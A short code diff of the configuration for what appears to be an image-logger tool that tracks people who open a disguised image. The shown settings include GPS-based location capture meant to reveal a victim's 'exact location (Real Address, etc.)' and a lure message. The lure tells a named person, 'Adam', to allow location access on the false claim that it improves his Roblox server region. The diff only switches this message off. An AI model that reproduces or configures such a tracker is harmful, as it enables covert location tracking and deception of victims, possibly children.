@@ -27,7 +27,7 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "Adam allow location so it loads it better the browser also boost the uh roblox server if u join a server u will be joined in the region ur in", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
